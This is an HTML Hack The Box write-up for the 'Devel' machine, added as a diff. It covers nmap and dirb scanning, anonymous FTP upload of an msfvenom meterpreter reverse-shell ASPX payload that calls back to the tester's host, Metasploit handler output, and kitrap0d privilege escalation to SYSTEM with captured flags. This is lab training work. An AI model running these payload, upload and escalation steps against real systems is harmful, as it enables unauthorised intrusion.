@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+    <html>
+    <head>
+        <meta charset="UTF-8">
+        <title>Devel HTB Write-up</title>
+        
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Microsoft/vscode/extensions/markdown-language-features/media/markdown.css">
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Microsoft/vscode/extensions/markdown-language-features/media/highlight.css">
+        
+        <style>
+.task-list-item { list-style-type: none; } .task-list-item-checkbox { margin-left: -20px; vertical-align: middle; }
+</style>
+        <style>
+            body {
+                font-family: -apple-system, BlinkMacSystemFont, 'Segoe WPC', 'Segoe UI', 'Ubuntu', 'Droid Sans', sans-serif;
+                font-size: 14px;
+                line-height: 1.6;
+            }
+        </style>
+        
+        
+    </head>
+    <body class="vscode-light">
+        <h1 id="devel-htb-write-up">Devel HTB Write-up</h1>
+<p>Machine IP - 10.10.10.5</p>
+<h3 id="initial-phase">Initial Phase</h3>
+<p>Starting with an nmap scan, we get the following -</p>
+<pre><code><code><div>root@kali:~/Desktop/Hack The Box/devel# nmap -F 10.10.10.5
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-20 09:17 +04
+Nmap scan report for 10.10.10.5
+Host is up (0.22s latency).
+Not shown: 98 filtered ports
+PORT   STATE SERVICE
+21/tcp open  ftp
+80/tcp open  http
+Nmap done: 1 IP address (1 host up) scanned in 7.88 seconds
+</div></code></code></pre>
+<p>This gives 2 services to go on and to put an nmap full scan in the background.</p>
+<p>The website shows the following landing page -
+<img src="develss\landing_page.png" /></p>
+<p>Meanwhile, the complete scan of all ports reveals the same result as the fast scan. Therefore, these two services are the only ones we can go on.</p>
+<p>A uniscan on the IP address reveals along with a dirb scan reveals no outcome. Dirb basically assures the aspnet server by showing the following result -</p>
+<pre><code><code><div>root@kali:~/Desktop/Hack The Box/devel# dirb http://10.10.10.5/
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+START_TIME: Wed Mar 20 09:58:14 2019
+URL_BASE: http://10.10.10.5/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+-----------------
+GENERATED WORDS: 4612                                                          
+---- Scanning URL: http://10.10.10.5/ ----
+==&gt; DIRECTORY: http://10.10.10.5/aspnet_client/
+---- Entering directory: http://10.10.10.5/aspnet_client/ ----
+==&gt; DIRECTORY: http://10.10.10.5/aspnet_client/system_web/
+---- Entering directory: http://10.10.10.5/aspnet_client/system_web/ ----
+-----------------
+END_TIME: Wed Mar 20 10:51:19 2019
+DOWNLOADED: 13836 - FOUND: 0
+</div></code></code></pre>
+<p>Now, turning to the FTP, we can try anonymous login, which actually works and we get the following -</p>
+<pre><code><code><div>root@kali:~/Desktop/Hack The Box/devel# ftp 10.10.10.5
+Connected to 10.10.10.5.
+220 Microsoft FTP Service
+Name (10.10.10.5:root): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password:
+230 User logged in.
+Remote system type is Windows_NT.
+ftp&gt; pwd
+257 &quot;/&quot; is current directory.
+ftp&gt; dir
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+03-18-17  01:06AM       &lt;DIR&gt;          aspnet_client
+03-17-17  04:37PM                  689 iisstart.htm
+03-17-17  04:37PM               184946 welcome.png
+226 Transfer complete.
+ftp&gt;
+</div></code></code></pre>
+<p>This is the same folder where the aspnet files were found by dirb. This directory has a welcome.png file which is likely the IIS 7 image as shown on the web page above. The iisstart.htm should be the default web page of iis. The anonymous ftp seems to have write permissions in the folder. This can be checked as follows -</p>
+<pre><code><code><div>root@kali:~/Desktop/Hack The Box/devel# cat &gt; hello.html
+this is a test file for tanq
+root@kali:~/Desktop/Hack The Box/devel# ftp 10.10.10.5
+Connected to 10.10.10.5.
+220 Microsoft FTP Service
+Name (10.10.10.5:root): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password:
+230 User logged in.
+Remote system type is Windows_NT.
+ftp&gt; dir
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+03-18-17  01:06AM       &lt;DIR&gt;          aspnet_client
+03-17-17  04:37PM                  689 iisstart.htm
+03-17-17  04:37PM               184946 welcome.png
+226 Transfer complete.
+ftp&gt; put hello.html
+local: hello.html remote: hello.html
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+226 Transfer complete.
+30 bytes sent in 0.00 secs (207.7793 kB/s)
+</div></code></code></pre>
+<p>Now we can navigate to the file and check if the file has been uploaded and is it rendered by the web server -
+<img src="develss\can_upload_file.png" /></p>
+<p>Therefore, if we put a file into this folder, we can navigate to that file on the browser. Therefore, we can use an exploit which can give us a reverse shell. This can likely work if the file is an aspx given the type of server. This is done as follows -</p>
+<pre><code><code><div>root@kali:~/Desktop/Hack The Box/devel# whatweb 10.10.10.5
+http://10.10.10.5 [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/7.5], IP[10.10.10.5], Microsoft-IIS[7.5][Under Construction], Title[IIS7], X-Powered-By[ASP.NET]
+root@kali:~/Desktop/Hack The Box/devel# msfvenom --list payloads | grep windows | grep meterpreter | grep reverse_tcp
+windows/meterpreter/reverse_tcp                     Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Connect back to the attacker
+windows/meterpreter/reverse_tcp_allports            Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Try to connect back to the attacker, on all possible ports (1-65535, slowly)
+windows/meterpreter/reverse_tcp_dns                 Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Connect back to the attacker
+windows/meterpreter/reverse_tcp_rc4                 Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Connect back to the attacker
+...
+...
+...
+</div></code></code></pre>
+<p>Therefore, we can use the first payload that is listed.</p>
+<pre><code><code><div>root@kali:~/Desktop/Hack The Box/devel# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.68 LPORT=4444
+-f aspx &gt; develtanq.aspx
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 341 bytes
+Final size of aspx file: 2798 bytes
+</div></code></code></pre>
+<p>Now we can log onto the FTP again and get the reverse shell by putting the file on the web server directory and navigating to it while keeping the listener listening.</p>
+<pre><code><code><div>root@kali:~/Desktop/Hack The Box/devel# ftp 10.10.10.5
+Connected to 10.10.10.5.
+220 Microsoft FTP Service
+Name (10.10.10.5:root): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password:
+230 User logged in.
+Remote system type is Windows_NT.
+ftp&gt; put develtanq.aspx
+local: develtanq.aspx remote: develtanq.aspx
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+226 Transfer complete.
+2834 bytes sent in 0.00 secs (22.3365 MB/s)
+</div></code></code></pre>
+<p>Now we can keep a listener open and run the aspx file by navigating to it at <code>http://10.10.10.5/develtanq.aspx</code>.</p>
+<pre><code><code><div>root@kali:~/Desktop/Hack The Box/devel# msfconsole -q
+
+msf5 &gt;
+msf5 &gt; use exploit/multi/handler
+msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
+payload =&gt; windows/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) &gt; set LHOST 10.10.14.68
+LHOST =&gt; 10.10.14.68
+msf5 exploit(multi/handler) &gt; set LPORT 4444
+LPORT =&gt; 4444
+msf5 exploit(multi/handler) &gt; exploit
+
+[*] Started reverse TCP handler on 10.10.14.68:4444
+[*] Sending stage (179779 bytes) to 10.10.10.5
+[*] Meterpreter session 1 opened (10.10.14.68:4444 -&gt; 10.10.10.5:49162) at 2019-03-23 17:39:32 +0400
+
+meterpreter &gt; sysinfo
+Computer        : DEVEL
+OS              : Windows 7 (Build 7600).
+Architecture    : x86
+System Language : el_GR
+Domain          : HTB
+Logged On Users : 0
+Meterpreter     : x86/windows
+meterpreter &gt;
+</div></code></code></pre>
+<p>Now we get the meterpreter shell of the machine. We can use the exploit suggest from here.</p>
+<pre><code><code><div>root@kali:~/Desktop/Hack The Box/devel# msfconsole -q
+msf5 &gt; search suggest
+
+Matching Modules
+================
+
+ Name                                             Disclosure Date  Rank    Check  Description
+ ----                                             ---------------  ----    -----  -----------
+ auxiliary/server/icmp_exfil                                       normal  No     ICMP Exfiltration Service
+ exploit/windows/browser/ms10_018_ie_behaviors    2010-03-09       good    No     MS10-018 Microsoft Internet Explorer DHTML Behaviors Use After Free
+ exploit/windows/smb/timbuktu_plughntcommand_bof  2009-06-25       great   No     Timbuktu PlughNTCommand Named Pipe Buffer Overflow
+ post/multi/recon/local_exploit_suggester                          normal  No     Multi Recon Local Exploit Suggester
+ post/osx/gather/enum_colloquy                                     normal  No     OS X Gather Colloquy Enumeration
+</div></code></code></pre>
+<p>Here, the post recon local exploit suggest can be used. Therefore, we run this at the meterpreter shell.</p>
+<pre><code><code><div>meterpreter &gt; run post/multi/recon/local_exploit_suggester
+
+[*] 10.10.10.5 - Collecting local exploits for x86/windows...
+[*] 10.10.10.5 - 29 exploit checks are being tried...
+[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The target service is running, but could not be validated.
+[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The target service is running, but could not be validated.
+[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The target service is running, but could not be validated.
+[+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated.
+[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+</div></code></code></pre>
+<p>We see the following suggested exploits and can try these one by one. Trying the first one -</p>
+<pre><code><code><div>meterpreter &gt; background
+[*] Backgrounding session 1...
+msf5 exploit(multi/handler) &gt; use exploit/windows/local/bypassuac_eventvwr
+msf5 exploit(windows/local/bypassuac_eventvwr) &gt; show options
+Module options (exploit/windows/local/bypassuac_eventvwr):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   yes       The session to run this module on.
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows x86
+msf5 exploit(windows/local/bypassuac_eventvwr) &gt; set SESSION 1
+SESSION =&gt; 1
+msf5 exploit(windows/local/bypassuac_eventvwr) &gt; exploit
+
+[*] Started reverse TCP handler on 192.168.72.128:4444
+[-] Exploit aborted due to failure: no-access: Not in admins group, cannot escalate with this module
+[*] Exploit completed, but no session was created.
+msf5 exploit(windows/local/bypassuac_eventvwr) &gt; show options
+Module options (exploit/windows/local/bypassuac_eventvwr):
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION  1                yes       The session to run this module on.
+Payload options (windows/meterpreter/reverse_tcp):
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.72.128   yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+Exploit target:
+   Id  Name
+   --  ----
+   0   Windows x86
+msf5 exploit(windows/local/bypassuac_eventvwr) &gt; set LHOST 10.10.14.68
+LHOST =&gt; 10.10.14.68
+msf5 exploit(windows/local/bypassuac_eventvwr) &gt; set LPORT 4445
+LPORT =&gt; 4445
+msf5 exploit(windows/local/bypassuac_eventvwr) &gt; exploit
+
+[*] Started reverse TCP handler on 10.10.14.68:4445
+[-] Exploit aborted due to failure: no-access: Not in admins group, cannot escalate with this module
+[*] Exploit completed, but no session was created.
+</div></code></code></pre>
+<p>This exploit did not work therefore, trying the next exploit, we can do the following -</p>
+<pre><code><code><div>msf5 exploit(multi/handler) &gt; use exploit/windows/local/ms10_015_kitrap0d
+msf5 exploit(windows/local/ms10_015_kitrap0d) &gt; show options
+
+Module options (exploit/windows/local/ms10_015_kitrap0d):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION  5                yes       The session to run this module on.
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.10.14.68      yes       The listen address (an interface may be specified)
+   LPORT     4445             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows 2K SP4 - Windows 7 (x86)
+
+msf5 exploit(windows/local/ms10_015_kitrap0d) &gt; set SESSION 1
+SESSION =&gt; 1
+msf5 exploit(windows/local/ms10_015_kitrap0d) &gt; set LHOST tun0
+LHOST =&gt; tun0
+msf5 exploit(windows/local/ms10_015_kitrap0d) &gt; set LPORT 4448
+LPORT =&gt; 4448
+msf5 exploit(windows/local/ms10_015_kitrap0d) &gt; run
+
+[*] Started reverse TCP handler on 10.10.14.68:4448
+[*] Launching notepad to host the exploit...
+[+] Process 3820 launched.
+[*] Reflectively injecting the exploit DLL into 3820...
+[*] Injecting exploit into 3820 ...
+[*] Exploit injected. Injecting payload into 3820...
+[*] Payload injected. Executing exploit...
+[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
+[*] Sending stage (179779 bytes) to 10.10.10.5
+[*] Meterpreter session 8 opened (10.10.14.68:4448 -&gt; 10.10.10.5:49163) at 2019-03-23 18:10:26 +0400
+
+meterpreter &gt; shell
+[-] Unknown command: shell.
+meterpreter &gt; sessions -i 8
+meterpreter &gt; shell
+Process 2680 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+c:\windows\system32\inetsrv&gt;whoami
+whoami
+nt authority\system
+
+c:\windows\system32\inetsrv&gt;cd ../../..
+cd ../../..
+
+c:\&gt;cd Users
+cd Users
+
+c:\Users&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 8620-71F1
+
+ Directory of c:\Users
+
+18/03/2017  01:16 ��    &lt;DIR&gt;          .
+18/03/2017  01:16 ��    &lt;DIR&gt;          ..
+18/03/2017  01:16 ��    &lt;DIR&gt;          Administrator
+17/03/2017  04:17 ��    &lt;DIR&gt;          babis
+18/03/2017  01:06 ��    &lt;DIR&gt;          Classic .NET AppPool
+14/07/2009  09:20 ��    &lt;DIR&gt;          Public
+               0 File(s)              0 bytes
+               6 Dir(s)  24.478.040.064 bytes free
+
+c:\Users&gt;cd babis\Desktop
+cd babis\Desktop
+
+c:\Users\babis\Desktop&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 8620-71F1
+
+ Directory of c:\Users\babis\Desktop
+
+18/03/2017  01:14 ��    &lt;DIR&gt;          .
+18/03/2017  01:14 ��    &lt;DIR&gt;          ..
+18/03/2017  01:18 ��                32 user.txt.txt
+               1 File(s)             32 bytes
+               2 Dir(s)  24.478.040.064 bytes free
+
+c:\Users\babis\Desktop&gt;type user.txt.txt
+type user.txt.txt
+9ecdd6a3aedf24b41562fea70f4cb3e8
+c:\Users\babis\Desktop&gt;cd ../../
+cd ../../
+
+c:\Users&gt;cd Administrator\Desktop
+cd Administrator\Desktop
+
+c:\Users\Administrator\Desktop&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 8620-71F1
+
+ Directory of c:\Users\Administrator\Desktop
+
+18/03/2017  01:17 ��    &lt;DIR&gt;          .
+18/03/2017  01:17 ��    &lt;DIR&gt;          ..
+18/03/2017  01:17 ��                32 root.txt.txt
+               1 File(s)             32 bytes
+               2 Dir(s)  24.478.040.064 bytes free
+
+c:\Users\Administrator\Desktop&gt;type root.txt.txt
+type root.txt.txt
+e621a0b5041708797c4fc4728bc72b4b
+</div></code></code></pre>
+<p>That gives us the shell as the root and we can read the user and root files on the system.</p>
+
+    </body>
+    </html>
